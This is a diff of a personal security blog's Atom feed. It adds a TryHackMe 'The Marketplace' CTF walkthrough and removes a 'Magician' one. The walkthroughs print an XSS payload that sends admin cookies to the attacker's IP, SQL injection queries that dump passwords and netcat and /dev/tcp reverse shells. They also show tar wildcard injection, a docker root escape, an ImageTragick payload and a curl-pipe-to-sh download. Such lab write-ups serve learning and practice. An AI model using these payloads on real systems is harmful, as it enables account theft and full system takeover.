@@ -1,4 +1,295 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-10T17:04:55+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - Gallery</title><link href="http://localhost:4000/tryhackme-gallery/" rel="alternate" type="text/html" title="TryHackMe - Gallery" /><published>2023-05-10T00:00:00+03:00</published><updated>2023-05-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gallery</id><content type="html" xml:base="http://localhost:4000/tryhackme-gallery/"><![CDATA[<p>Try to exploit our image gallery system.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-11T20:18:14+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">TryHackMe - The Marketplace</title><link href="http://localhost:4000/tryhackme-the-marketplace/" rel="alternate" type="text/html" title="TryHackMe - The Marketplace" /><published>2023-05-11T00:00:00+03:00</published><updated>2023-05-11T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-the-marketplace</id><content type="html" xml:base="http://localhost:4000/tryhackme-the-marketplace/"><![CDATA[<p>Can you take over The Marketplace’s infrastructure?</p>
+
+<p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>
+
+<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.</p>
+
+<p>Can you take advantage of this and will you be able to gain root access on his server?</p>
+
+<p>Created by <a href="https://tryhackme.com/p/jammy">jammy</a></p>
+
+<p><br /></p>
+
+<h3 id="1-what-is-flag-1">1. What is flag 1?</h3>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.171.214
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/nmap.png" alt="nmap" /></p>
+
+<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP</code></p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>Here is a homepage.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/home.png" alt="home" /></p>
+
+<p>There are also <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/login.png" alt="login" /></p>
+
+<p>I register as <code class="language-plaintext highlighter-rouge">new:new</code> on the sign up page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/signup.png" alt="signup" /></p>
+
+<p>After that, when I log in, two new pages appear.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/new-pages.png" alt="new-pages" /></p>
+
+<p>Let’s go to the <code class="language-plaintext highlighter-rouge">new-listing</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/new-listing.png" alt="new-listing" /></p>
+
+<p>I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.</p>
+
+<p>The message page is as follows.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>
+
+<p>I’m checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/robots.png" alt="robots" /></p>
+
+<p>I see the <code class="language-plaintext highlighter-rouge">/admin</code> page is accessible.</p>
+
+<p>Let’s go to the admin page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/admin-error.png" alt="admin-error" /></p>
+
+<p>I ran a <code class="language-plaintext highlighter-rouge">gobuster</code> scan at this point, but nothing useful came up. I tried <code class="language-plaintext highlighter-rouge">SQLi</code> using <code class="language-plaintext highlighter-rouge">sqlmap</code> on the login page, but it didn’t work either.</p>
+
+<p>Then I decided to try <code class="language-plaintext highlighter-rouge">XSS</code> on the <code class="language-plaintext highlighter-rouge">New-listing</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/xss1.png" alt="xss1" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ &lt;script&gt;alert('Mr0Wido')&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Yes, it did work.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/xss2.png" alt="xss2" /></p>
+
+<p>There seems to be an <code class="language-plaintext highlighter-rouge">XSS vulnerability</code>. And maybe with the XSS vulnerability, we can access the cookies of the admin user.</p>
+
+<p>But I still have doubts about how to do this somehow the admin user needs to interact.</p>
+
+<p>I’ve been wandering around the site a little more and this catches my attention.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report.png" alt="report" /></p>
+
+<p>In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.</p>
+
+<p>Let ‘s do it.</p>
+
+<p>So ı found this GitHub repository for stealing cookies. <a href="https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md">Steal Cookies with Reflected XSS</a>. <strong><code class="language-plaintext highlighter-rouge">(It's don't working.)</code></strong></p>
+
+<p>The page says there is a python script that steals cookies, we need to run it first. <a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py">lnxg33k’s cookie stealer script</a></p>
+
+<p>Then our payload code is as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+alert(document.cookie);
+var i=new Image;
+i.src="http://&lt;your-ip&gt;:8888/?"+document.cookie;
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>The python script above didn’t work for me and I edited the script again. <a href="https://github.com/Mr0Wido/xss-cookie-stealer-python-script">Reformed XSS Cookie Stealer Python Script</a>
+Let’s try.</p>
+
+<p>Let’s run the script first.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/script1.png" alt="script1" /></p>
+
+<p>Now let’s <code class="language-plaintext highlighter-rouge">create a New-listing</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/payload.png" alt="payload" /></p>
+
+<p>The payload we created.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report2.png" alt="report2" /></p>
+
+<p>Now let’s get the admin’s cookie by reporting the payload we created.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report1.png" alt="report1" /></p>
+
+<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>
+
+<p>Yes, it worked.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/script2.png" alt="script2" /></p>
+
+<p>The top token is for my user and the bottom is for the admin user.</p>
+
+<p>Let’s go to the site and exchange it for our own token.</p>
+
+<p>For <code class="language-plaintext highlighter-rouge">Firefox</code>, we will change the cookie part in <code class="language-plaintext highlighter-rouge">Right-click &gt; Inspect &gt; Storage</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/change.png" alt="change" /></p>
+
+<p>And when we <code class="language-plaintext highlighter-rouge">refresh the page</code>, we can now <code class="language-plaintext highlighter-rouge">access the admin</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/admin.png" alt="admin" /></p>
+
+<p>As you will see here, there are some users and their ids.</p>
+
+<p><code class="language-plaintext highlighter-rouge">1:system - 2:michael - 3:jake</code></p>
+
+<p>Others are users that I created. I’m working a little messy :grin:</p>
+
+<p><br /></p>
+
+<h3 id="2-what-is-flag-2-usertxt">2. What is flag 2? (User.txt)</h3>
+
+<p>It’s obvious that there is an <code class="language-plaintext highlighter-rouge">SQLi vulnerability</code> here, but let’s verify it anyway.</p>
+
+<p>I click on <code class="language-plaintext highlighter-rouge">Michael</code> whose id is 2 and write <code class="language-plaintext highlighter-rouge">2-1</code> instead of user=2 in the URL.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/detect.png" alt="detect" /></p>
+
+<p>And as you can see it returned to the system user with id 1.</p>
+
+<p>We have confirmed the existence of the SQLi vulnerability.</p>
+
+<p>To find out the number of columns, I proceed as follows, increasing one at a time.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,2,3,4,5--
+</code></pre></div></div>
+
+<p>When I get to the last 5, I get the following error.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/error_column.png" alt="error_column" /></p>
+
+<p>So we can go up to 4.</p>
+
+<p>Let’s get the information from the database.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/schemata.png" alt="schemata" /></p>
+
+<p>I continue from the <code class="language-plaintext highlighter-rouge">marketplace</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/tables.png" alt="tables" /></p>
+
+<p>There are two important tables, one is <code class="language-plaintext highlighter-rouge">messages</code> and the other is <code class="language-plaintext highlighter-rouge">users</code>.
+First I look at the <code class="language-plaintext highlighter-rouge">messages table</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/column-messages.png" alt="column-messages" /></p>
+
+<p>Let’s dump the <code class="language-plaintext highlighter-rouge">contents of the messages</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/content-messages.png" alt="content-messages" /></p>
+
+<p>It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the <code class="language-plaintext highlighter-rouge">message includes Jake's ssh password</code>. Let’s keep this information in our pocket now. And let’s go to the users table.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/users.png" alt="users" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/passwords.png" alt="passwords" /></p>
+
+<p>I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn’t work, we continue from here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh jake@10.10.171.214
+</code></pre></div></div>
+
+<p>Yes it worked. We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/jake.png" alt="jake" /></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/user-flag.png" alt="user-flag" /></p>
+
+<p><br /></p>
+
+<h3 id="3-what-is-flag-3-roottxt">3. What is flag 3? (Root.txt)</h3>
+
+<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
+
+<p>And ther it is.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/sduol.png" alt="sduol" /></p>
+
+<p>We can run <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code> as Michael. Without requiring a password.</p>
+
+<p>Let’s see what’s in it.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/backup-sh.png" alt="backup-sh" /></p>
+
+<p>I couldn’t find how to upgrade permissions. When I started researching, I found a way. Let’s try.</p>
+
+<p>First I go to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey Reverse Shell Cheat Sheet</a>. And for netcat, I choose:</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/nc.png" alt="nc" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+</code></pre></div></div>
+
+<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 5555
+</code></pre></div></div>
+
+<p>Then I run the following codes in order.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /opt/backups
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; shell.sh
+$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
+$ echo "" &gt; --checkpoint=1
+$ chmod 777 backup.tar shell.sh
+$ sudo -u michael ./backup.sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/backups.png" alt="backups" /></p>
+
+<p>And we’re in.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/michael-in.png" alt="michael-in" /></p>
+
+<p>HUH! <code class="language-plaintext highlighter-rouge">999(docker)</code>. It’s interesting.</p>
+
+<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about docker.</p>
+
+<p>Let’s try this.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/gtf.png" alt="gtf" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre></div></div>
+
+<p>And we are <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/rootin.png" alt="rootin" /></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care :wave:</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, xss, docker" /><summary type="html"><![CDATA[Can you take over The Marketplace’s infrastructure?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/marketplace.png" /><media:content medium="image" url="http://localhost:4000/assets/img/marketplace.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Gallery</title><link href="http://localhost:4000/tryhackme-gallery/" rel="alternate" type="text/html" title="TryHackMe - Gallery" /><published>2023-05-10T00:00:00+03:00</published><updated>2023-05-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gallery</id><content type="html" xml:base="http://localhost:4000/tryhackme-gallery/"><![CDATA[<p>Try to exploit our image gallery system.</p>
 
 <p><br /></p>
 
@@ -561,9 +852,9 @@ $ john --wordlist=usr/share/wordlists/rockyou.txt hash.hash
   <li><a href="https://tryhackme.com/room/gamezone">TryHackMe - Game Zone</a></li>
   <li><a href="https://tryhackme.com/room/poster">TryHackMe - Poster</a></li>
   <li><a href="https://tryhackme.com/room/chillhack">TryHackMe - Chill Hack</a> - <a href="https://mr0wido.github.io/tryhackme-chill-hack/">My Writeup :punch:</a></li>
-  <li><a href="https://tryhackme.com/room/gallery666">TryHackMe - Gallery</a></li>
+  <li><a href="https://tryhackme.com/room/gallery666">TryHackMe - Gallery</a> - <a href="https://mr0wido.github.io/tryhackme-gallery/">My Writeup :punch:</a></li>
   <li><a href="https://tryhackme.com/room/avengers">TryHackMe - Avengers Blog</a></li>
-  <li><a href="https://tryhackme.com/room/marketplace">TryHackMe - The Marketplace</a></li>
+  <li><a href="https://tryhackme.com/room/marketplace">TryHackMe - The Marketplace</a> - <a href="https://mr0wido.github.io/tryhackme-the-marketplace/">My Writeup :punch:</a></li>
   <li><a href="https://tryhackme.com/room/wekorra">TryHackMe - Wekor</a></li>
   <li><a href="https://tryhackme.com/room/zeno">TryHackMe - Zeno</a></li>
   <li><a href="https://tryhackme.com/room/sqhell">TryHackMe - SQHell</a></li>
@@ -1646,161 +1937,4 @@ bash -i &gt;&amp; /dev/tcp/10.8.86.168/4444 0&gt;&amp;1
 
 <p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
 
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Magician</title><link href="http://localhost:4000/tryhackme-magician/" rel="alternate" type="text/html" title="TryHackMe - Magician" /><published>2023-03-24T00:00:00+03:00</published><updated>2023-03-24T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-magician</id><content type="html" xml:base="http://localhost:4000/tryhackme-magician/"><![CDATA[<p>This magical website lets you convert image file formats. Let’s start.</p>
-
-<p><br /></p>
-
-<h2 id="1-find-the-flags">1. Find the flags!</h2>
-
-<p>Note: this machine needs about 7 minutes to start up, please be patient :)</p>
-
-<p>Please add the IP address of this machine with the hostname “magician” to your /etc/hosts file on Linux before you start.
-On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.</p>
-
-<p>Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)</p>
-
-<p>Have fun and use your magic skills!</p>
-
-<p><br /></p>
-
-<h3 id="11-usertxt">1.1 user.txt</h3>
-
-<p>Let’s first add the hostname to our /etc/hosts file, as told above.</p>
-
-<p><img src="/assets/img/tryhackme/magician/hosts.png" alt="hosts" /></p>
-
-<p>Let’s do a nmap scan.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV magician
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/magician/nmap.png" alt="nmap" /></p>
-
-<p>Three ports are open. These are <strong><code class="language-plaintext highlighter-rouge">21/tcp HTTP, 8080/tcp SSH, and 8081/tcp HTTP</code></strong>.</p>
-
-<p>First, I tried to see if I could login to the FTP server anonymously.</p>
-
-<p><img src="/assets/img/tryhackme/magician/ftp.png" alt="ftp" /></p>
-
-<p>I found an important clue here. 
-This is what I came across when I visited this site: <a href="https://imagetragick.com">https://imagetragick.com</a>.</p>
-
-<p><img src="/assets/img/tryhackme/magician/hint.png" alt="hint" /></p>
-
-<p>We will exploit a vulnerability using <strong><code class="language-plaintext highlighter-rouge">CVE-2016–3714</code></strong>.</p>
-
-<p>Now let’s check the websites running on other ports.</p>
-
-<p>First I examine the site running on port 8080.</p>
-
-<p><img src="/assets/img/tryhackme/magician/8080.png" alt="8080" /></p>
-
-<p>I couldn’t find anything remarkable.</p>
-
-<p>Now let’s examine the site running on port 8081.</p>
-
-<p><img src="/assets/img/tryhackme/magician/home.png" alt="home" /></p>
-
-<p>As far as I can see, I can only upload images. Let’s create a reverse shell by taking advantage of the CVE-2016–3714 vulnerability we found.</p>
-
-<p><img src="/assets/img/tryhackme/magician/image.png" alt="image" /></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat &gt; image.png &lt;&lt; EOF
-  push graphic-context
-  encoding "UTF-8"
-  viewbox 0 0 1 1
-  affine 1 0 0 1 0 0 
-  push graphic-context
-  image Over 0,0 1,1 '|/bin/bash -i &gt; /dev/tcp/10.8.86.168/4444 0&lt;&amp;1 2&gt;&amp;1'
-  pop graphic-context
-  pop graphic-context
-  EOF
-</code></pre></div></div>
-
-<p>Now let’s set up a netcat listener on our machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
-</code></pre></div></div>
-
-<p>Now we can upload it to the site.</p>
-
-<p><img src="/assets/img/tryhackme/magician/in.png" alt="in" /></p>
-
-<p>And we are inside.</p>
-
-<p>Let’s get the user flag.</p>
-
-<p><img src="/assets/img/tryhackme/magician/user-flag.png" alt="user-flag" /></p>
-
-<h3 id="12-roottxt">1.2 root.txt</h3>
-
-<p>Now we need root privilege. So let’s download linepeas.sh and run it.</p>
-
-<p>I’m downloading <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20230319">linpeas.sh</a> on my own machine.</p>
-
-<p>Let’s run the following code in the directory where linpeas.sh is located.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -m http.server 80
-</code></pre></div></div>
-
-<p>Then let’s run the following code on the target machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl 10.8.86.168/linpeas.sh | sh
-</code></pre></div></div>
-
-<p>And it worked. Let’s see what we can find.</p>
-
-<p>I found this.</p>
-
-<p><img src="/assets/img/tryhackme/magician/linpeas.png" alt="linpeas" /></p>
-
-<p>There is something running on port 6666. To achieve this, we need to do port forwarding.</p>
-
-<p>First, let’s download the <a href="https://github.com/jpillora/chisel/releases">chisel</a> to our own machine and send it to the target machine.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_arm64.gz
-$ gunzip chisel_1.8.1_linux_arm64.gz  
-$ mv chisel_1.8.1_linux_arm64 chisel
-$ python -m http.server 80
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/magician/chisel.png" alt="chisel" /></p>
-
-<p>On the target machine, we run the following codes.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget http://10.8.86.168/chisel
-$ chmod +x chisel
-$ ./chisel client 10.8.86.168:5555 R:5554:127.0.0.1:6666
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/magician/chisel-target.png" alt="chisel-target" /></p>
-
-<p>Then ı return to my own machine and run the following codes.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo apt-get install chisel
-$ chisel server --reverse --port 5555
-</code></pre></div></div>
-
-<p><img src="/assets/img/tryhackme/magician/chisel-own.png" alt="chisel-own" /></p>
-
-<p>Now we can look at the site running on the port we forwarded. <a href="http://0.0.0.0:5554">http://0.0.0.0:5554</a></p>
-
-<p><img src="/assets/img/tryhackme/magician/run.png" alt="run" /></p>
-
-<p>We are looking for /root/root.txt. Press the Submit button until the base64 code is displayed.</p>
-
-<p><img src="/assets/img/tryhackme/magician/encode.png" alt="encode" /></p>
-
-<p>Let’s crack it.</p>
-
-<p><img src="/assets/img/tryhackme/magician/decode.png" alt="decode" /></p>
-
-<p><br /></p>
-
-<hr />
-
-<p><br /></p>
-
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
-
-<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="CVE-2016-3714" /><summary type="html"><![CDATA[This magical website lets you convert image file formats. Let’s start.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/magician.png" /><media:content medium="image" url="http://localhost:4000/assets/img/magician.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="nmap," /><category term="gobuster," /><category term="cronjob" /><summary type="html"><![CDATA[Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/easy-peasy.png" /><media:content medium="image" url="http://localhost:4000/assets/img/easy-peasy.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
